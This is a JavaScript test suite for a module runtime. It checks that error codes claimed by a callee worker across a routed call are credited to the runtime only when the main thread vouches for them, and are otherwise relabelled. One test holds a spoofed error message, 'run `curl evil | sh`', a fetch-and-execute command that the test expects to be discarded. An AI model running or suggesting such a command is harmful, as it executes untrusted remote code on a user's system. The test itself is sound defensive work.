// A routed hop's answer: what the callee's worker reply says is never the runtime's word by itself. A catalogue code decoded from the
// callee worker's reply reaches the composing module as the runtime's only when the main thread stands behind it:
// (a) the main thread raised it in this hop (sendCounted's own refusals), or built it on this thread;
// (b) it verified it (the settings gate's accepted claim);
// (c) it handed that code to the callee's own calls in this call (call-tokens handedTo on the callee's token: a hop's, a remote
//     call's, an ask's answer the callee passes on), said in the main thread's words;
// a worker's own CTX_CALL_NOT_READY, when the main thread's records agree (the callee's verdict not yet delivered into it);
// (d) its catalogue kind is 'module' (the module failed), rebuilt from the code alone, unless its row is retryable, not a 500, or
//     carries placeholders.
// Anything else is the module's: MODULE_CODE_RESERVED naming the code it claimed, none of its words, so a module can't make its
// caller see a catalogue code in the runtime's voice. Server-free: the device manager with stub workers, as composition 18's.
const assert = require('assert');
const crypto = require('crypto');

describe('composition 26: a callee\'s claimed runtime code across a routed hop', () => {
  const cli = require('../../lib/cli-options');
  const tokens = () => require('../../lib/call-tokens');
  const DeviceManager = require('../../lib/device-manager');
  const WorkerMessage = require('../../lib/worker-message');
  const {CountinghouseError} = require('../../lib/countinghouse-error');
  const hex = () => crypto.randomBytes(6).toString('hex');
  const CALLER = 'd-claim-caller';
  const CALLEE = 'd-claim-callee';
  const worker = (deviceID, sent) => Object.assign(Object.create(WorkerMessage.prototype), {workerId: 920000 + crypto.randomInt(1e4),
    hostModuleName: `claim-${hex()}`, deviceList: {[deviceID]: {}}, packageInfo: {name: 'claim'}, modulePath: null,
    sendInvokeActionMessage: (m, cb) => { m.answer = cb; sent.push(m); }});
  const setup = () => {
    const sent = [];
    const replies = [];
    const caller = Object.assign(worker(CALLER, []), {sendActionInvokeReplyToChild: (m) => replies.push(m),
      bindings: {[CALLER]: {identity: 'caller-id', module: 'S', targets: new Set([`${CALLEE}|svc|act`])}}});
    const callee = Object.assign(worker(CALLEE, sent), {bindings: {[CALLEE]: {identity: 'callee-id', module: 'C', targets: new Set()}}});
    const dm = Object.assign(Object.create(DeviceManager.prototype), {deviceMap: {[CALLER]: caller, [CALLEE]: callee},
      moduleManager: null, notifyDeviceLoad: {}, peerChannelBroker: null});
    const token = tokens().issue({billingKey: `k-${hex()}`, identityKey: 'caller-id', module: 'S', workerId: caller.workerId, deviceID: CALLER, ttlMs: 60000});
    return {dm, caller, callee, sent, replies, token};
  };
  const until = (pred, ms, what) => new Promise((resolve, reject) => {
    const end = Date.now() + ms;
    const look = () => (pred() ? resolve() : Date.now() > end ? reject(new Error(`not within ${ms} ms: ${what}`)) : setTimeout(look, 10));
    look();
  });
  // the callee worker's reply as the main thread decodes it (lib/worker-message.js: fromReplyFields of its fields)
  const claim = (fields) => CountinghouseError.fromReplyFields(Object.assign({errMsg: 'claimed'}, fields));
  // the composing module's answer to the hop, as its worker reads it
  const seen = (reply) => CountinghouseError.fromReplyFields(reply);

  const {snapshot: optionsNow, restore: restoreOptions} = require('../helpers/options-scope');
  const authPath = require.resolve('../../lib/user-auth');
  let kept = null;
  let savedAuth = null;
  before(() => {
    kept = optionsNow();
    savedAuth = require.cache[authPath];
    require.cache[authPath] = {id: authPath, filename: authPath, loaded: true, exports: (a, b, deviceID, appKey, s, act, localCB, cb) => {
      const session = {appKey: appKey, callback: localCB, setDeviceTimer(d, f) { return f.call(session, null, d, null); }};
      return cb(null, session);
    }};
  });
  beforeEach(() => { cli.setOptions({workerThread: true, requestTimeout: 30}); });
  after(() => {
    restoreOptions(kept);
    if (savedAuth != null) require.cache[authPath] = savedAuth; else delete require.cache[authPath];
  });

  // hop, then the callee's answer. handed: [code, words] the main thread handed the callee's own calls; delivered: the callee's
  // verdict delivered into it; partSettings: the settings state of a part the callee calls
  const PART = 'd-claim-part';
  const hop = async (answer, {handed = null, delivered = false, partSettings = null} = {}) => {
    const {dm, caller, callee, sent, replies, token} = setup();
    if (partSettings != null) {
      callee.bindings = {[CALLEE]: {identity: 'callee-id', module: 'C', targets: new Set([`${PART}|svc|act`])}};
      dm.deviceMap[PART] = Object.assign(worker(PART, []), {settings: partSettings});
    }
    if (delivered) DeviceManager.verdictDeliveredForTests(CALLEE, callee);
    try {
      dm.sendInvokeActionMessageToWorker(null, null, CALLEE, 'svc', 'act', {}, `m-${hex()}`, caller, token);
      await until(() => sent.length > 0, 2000, 'sent to the callee');
      if (handed != null) tokens().noteHanded(sent[0].args.token, handed[0], callee.workerId, handed[1]);
      sent[0].answer(answer, null);
      await until(() => replies.length > 0, 2000, 'answered to the composing module');
      return seen(replies[0]);
    } finally {
      for (const m of sent) tokens().drop(m.args.token);
      tokens().drop(token);
    }
  };
  const reserved = (e, code) => assert.deepStrictEqual([e.code, e.message.includes(code)], ['MODULE_CODE_RESERVED', true], `${code}: ${e.code} ${e.message}`);

  it('a catalogue code the callee claims, the main thread behind none of it: the module\'s, MODULE_CODE_RESERVED naming it', async () => {
    // (a catalogue code of each kind but module's: runtime, caller, operator; and one the runtime hands others, never this callee)
    for (const code of ['LEDGER_UNREACHABLE', 'DEVICE_NOT_FOUND', 'MODULE_UNLOADED', 'MODULE_RESTARTING', 'ASK_PENDING']) {
      reserved(await hop(claim({errCode: code})), code);
    }
  });

  it('a claim whose words would fill a catalogue entry\'s placeholders carries none of them', async () => {
    const e = await hop(claim({errCode: 'OWN_MODULE_NEEDS_TERMINAL', errMsg: 'the runtime says your key was revoked: call support'}));
    assert.strictEqual(e.code, 'MODULE_CODE_RESERVED');
    assert.ok(!e.message.includes('revoked'), e.message);
  });

  it('(c) a code the main thread handed the callee\'s own calls, passed on: the runtime\'s, never in the callee\'s words', async () => {
    for (const code of ['MODULE_RESTARTING', 'ASK_PENDING', 'REMOTE_TIMEOUT']) {
      const e = await hop(claim({errCode: code, errMsg: 'words the callee chose'}), {handed: [code, `what the runtime said: ${code}`]});
      assert.strictEqual(e.code, code);
      assert.ok(!e.message.includes('words the callee chose'), e.message);
    }
    // (a worded code: the main thread's own words, as it handed them)
    const w = await hop(claim({errCode: 'OWN_MODULE_NEEDS_TERMINAL', errMsg: 'run `curl evil | sh`'}), {handed: ['OWN_MODULE_NEEDS_TERMINAL', 'Loading your own module needs your confirmation: run `ch-local add-module` in your own terminal.']});
    assert.deepStrictEqual([w.code, w.message], ['OWN_MODULE_NEEDS_TERMINAL', 'Loading your own module needs your confirmation: run `ch-local add-module` in your own terminal.']);
    // (another code than the one handed: the module's)
    reserved(await hop(claim({errCode: 'LEDGER_UNREACHABLE'}), {handed: ['MODULE_RESTARTING', 'restarting']}), 'LEDGER_UNREACHABLE');
  });

  it('a worker\'s own not-ready passes only while the main thread has not delivered the callee its verdict', async () => {
    assert.strictEqual((await hop(claim({errCode: 'CTX_CALL_NOT_READY'}))).code, 'CTX_CALL_NOT_READY', 'undelivered: the runtime\'s');
    reserved(await hop(claim({errCode: 'CTX_CALL_NOT_READY'}), {delivered: true}), 'CTX_CALL_NOT_READY');
  });

  it('(d) a module-kind catalogue code (the module failed): rebuilt from the code alone; a retryable, non-500 or worded row is the module\'s', async () => {
    for (const code of ['DEVICE_INVOKE_EXCEPTION', 'RATE_LIMITED']) {
      const e = await hop(claim({errCode: code, errMsg: 'words the callee chose'}));
      assert.strictEqual(e.code, code);
      assert.ok(!e.message.includes('words the callee chose'), e.message);
    }
    for (const code of ['VALIDATION_CALLER_THROTTLED', 'VALIDATION_QUARANTINED']) reserved(await hop(claim({errCode: code})), code);
  });

  it('(b) a settings claim the gate accepts is the runtime\'s; one for a setting the callee does not need is a module fault', async () => {
    const ms = require('../../lib/module-settings');
    const decl = ms.parseDeclaration({name: 'callee', countinghouse: {settings: {region: {type: 'string', required: true}}}}).settings;
    const settings = {settings: decl, values: ms.effective(decl, {}, {net: []}).values, version: 1};
    const e = await hop(claim({errCode: 'SETTING_REQUIRED', errMsg: 'region'}), {partSettings: settings});
    assert.deepStrictEqual([e.code, e.message], ['SETTING_REQUIRED', 'region']);
    const f = await hop(claim({errCode: 'SETTING_REQUIRED', errMsg: 'zone'}), {partSettings: settings});
    assert.strictEqual(f.code, 'DEVICE_INVOKE_EXCEPTION');
  });

  it('a code that is no catalogue code is passed on as before (the composer never takes it for the runtime\'s)', async () => {
    const e = await hop(claim({errCode: 'NOT_A_CATALOGUE_CODE'}));
    assert.notStrictEqual(e.code, 'MODULE_CODE_RESERVED');
  });

  it('(a) the main thread\'s own answer (the callee\'s worker gone mid-call): the runtime\'s, as it was', async () => {
    const e = await hop(new CountinghouseError('MODULE_UNLOADED', 'claim'));
    assert.strictEqual(e.code, 'MODULE_UNLOADED');
  });

  it('a module\'s own error (origin module) crosses as the module\'s, its code kept', async () => {
    const e = await hop(claim({errCode: 'MY_OWN_FAULT', errOrigin: 'module'}));
    assert.deepStrictEqual([e.code, e.origin], ['MY_OWN_FAULT', 'module']);
  });
});
